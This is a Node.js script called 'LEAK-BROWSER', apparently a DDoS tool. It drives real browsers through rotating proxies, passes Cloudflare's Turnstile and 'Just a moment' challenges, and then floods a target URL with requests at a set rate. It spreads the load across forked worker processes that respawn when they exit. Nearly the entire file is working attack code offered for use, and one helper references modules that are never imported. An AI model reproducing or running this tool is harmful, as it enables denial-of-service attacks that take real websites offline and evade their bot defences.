//npm i playwright
const cluster = require("cluster");
const fs = require("fs");
const os = require("os");
const { connect } = require("puppeteer-real-browser");

process.setMaxListeners(0);
process.on("uncaughtException", function (e) {
  console.log(e);
});
process.on("unhandledRejection", function (e) {
  console.log(e);
});

const debugMode = process.argv.includes("--debug");
//const resetEnabled = process.argv.includes("--reset");
//const bypassEnabled = process.argv.includes("--bypass");
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

if (!target || !time || !threads || !ratelimit || !proxyfile) {
  console.log(`
╔════════════════════════════════════╗
║             LEAK-BROWSER           ║
╚════════════════════════════════════╝
`);
  console.log("[!] Missing required arguments.\n");
  console.log("Usage:");
  console.log(
    "  node leak-browser.js <target> <time> <threads> <ratelimit> <proxyfile>\n"
  );
  console.log("Example:");
  console.log("  node leak-browser.js https://abc.com 60 10 64 proxy.txt\n");
  process.exit(1);
}

const pxfine = fs
  .readFileSync(proxyfile, "utf8")
  .replace(/\r/g, "")
  .split("\n");

function getRandomProxy() {
  const proxy = pxfine[Math.floor(Math.random() * pxfine.length)];
  const parts = proxy.split(":");
  if (parts.length === 2) {
    // ip:port
    return { host: parts[0], port: parts[1] };
  } else if (parts.length === 4) {
    // ip:port:user:pass
    return {
      host: parts[0],
      port: parts[1],
      username: parts[2],
      password: parts[3],
    };
  } else {
    throw new Error("Proxy format error: " + proxy);
  }
}

function randomChromeUA(baseUA) {
  return baseUA.replace(
    /Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/,
    (_, major, minor) => {
      const x = Math.floor(Math.random() * 100);
      const y = Math.floor(Math.random() * 100);
      return `Chrome/${major}.${minor}.${x}.${y}`;
    }
  );
}

function sendHttp2Request(target, ua, cookie, proxy) {
  return new Promise((resolve, reject) => {
    const { host, port, username, password } = proxy;
    const { hostname, pathname } = new URL(target);

    const conn = net.connect(port, host, () => {
      let headers =
        `CONNECT ${hostname}:443 HTTP/1.1\r\n` + `Host: ${hostname}:443\r\n`;
      if (username && password) {
        headers +=
          "Proxy-Authorization: Basic " +
          Buffer.from(`${username}:${password}`).toString("base64") +
          "\r\n";
      }
      headers += "\r\n";
      conn.write(headers);
    });

    conn.once("data", () => {
      const tlsSocket = tls.connect(
        {
          socket: conn,
          servername: hostname,
          ALPNProtocols: ["h2"],
        },
        () => {
          const client = http2.connect(`https://${hostname}`, {
            createConnection: () => tlsSocket,
          });

          const req = client.request({
            ":method": "GET",
            ":path": pathname,
            ":authority": hostname,
            "user-agent": ua,
            cookie: cookie,
          });

          let statusCode = null;

          req.on("response", (headers) => {
            statusCode = headers[":status"]; // lấy status từ server
          });

          req.on("end", () => {
            client.close();
            resolve(statusCode);
          });

          req.on("error", (err) => {
            client.close();
            reject(err);
          });

          req.end();
        }
      );
    });

    conn.on("error", (err) => {
      console.log(err);
      reject(err);
    });
  });
}

async function go() {
  const proxySettings = getRandomProxy();
  console.log("Using proxy: ", proxySettings.host);
  const { page, browser } = await connect({
    headless: false,
    args: [],
    customConfig: {},
    turnstile: true,
    connectOption: {},
    disableXvfb: false,
    ignoreAllFlags: false,
    headless: false,
    proxy: proxySettings,
  });

  await page.goto("https://lequan041023.site/");
  const baseUA = await page.evaluate(() => navigator.userAgent);
  const ua = randomChromeUA(baseUA);
  console.log("My UA:", ua);
  await page.goto(target);
  let verify = null;
  let startDate = Date.now();
  while (!verify && Date.now() - startDate < 15000) {
    const title = await page.title();
    if (title === "Attention Required! | Cloudflare") {
      console.log(`[${proxySettings.host}] bypass error`);
      break;
    }
    if (title !== "Just a moment...") {
      verify = true;
    }
    await new Promise((r) => setTimeout(r, 1000));
  }
  let counter = 0;
  const statusThisSecond = {};
  async function sendRequest() {
    try {
      const result = await page.evaluate(
        async ({ fetchUrl, ua }) => {
          const res = await fetch(fetchUrl, {
            method: "GET",
            credentials: "include",
            headers: { "User-Agent": ua },
          });
          return { status: res.status };
        },
        { fetchUrl: target, ua }
      );
      counter++;
      statusThisSecond[result.status] =
        (statusThisSecond[result.status] || 0) + 1;
    } catch (err) {
      counter++;
      statusThisSecond["ERR"] = (statusThisSecond["ERR"] || 0) + 1;
    }
  }

  const intervalMs = Math.floor(1000 / ratelimit);
  setInterval(() => {
    for (let i = 0; i < ratelimit; i++) {
      setTimeout(() => sendRequest(), i * intervalMs);
    }
  }, 1000);

  if (debugMode) {
    setInterval(() => {
      const summary = Object.entries(statusThisSecond)
        .map(([status, count]) => `${status}: ${count}`)
        .join(", ");
      console.log(`[${proxySettings.host}] Requests this second → ${summary}`);
      for (let key in statusThisSecond) delete statusThisSecond[key];
    }, 1000);
  }
  //browser.close();
}

if (cluster.isMaster) {
  console.log(`[INFO] LEAK-BROWSER starting...`);
  console.log(`[INFO] Target: ${target}`);
  console.log(`[INFO] Duration: ${time} seconds`);
  console.log(`[INFO] Threads: ${threads}`);
  console.log(`[INFO] Proxy file: ${proxyfile}`);
  console.log(`[INFO] Debug Mode: ${debugMode ? "ON" : "OFF"}`);
  //if (bypassEnabled) console.log("[INFO] Bypass mode: ON");
  //if (resetEnabled) console.log("[INFO] Reset mode: ON");
  Array.from({ length: threads }, (_, i) =>
    cluster.fork({ core: i % os.cpus().length })
  );
  cluster.on("exit", (worker) => {
    cluster.fork({ core: worker.id % os.cpus().length });
  });
  setTimeout(() => process.exit(1), time * 1000);
} else {
  setInterval(go, 10000);
  setTimeout(() => process.exit(1), time * 1000);
}
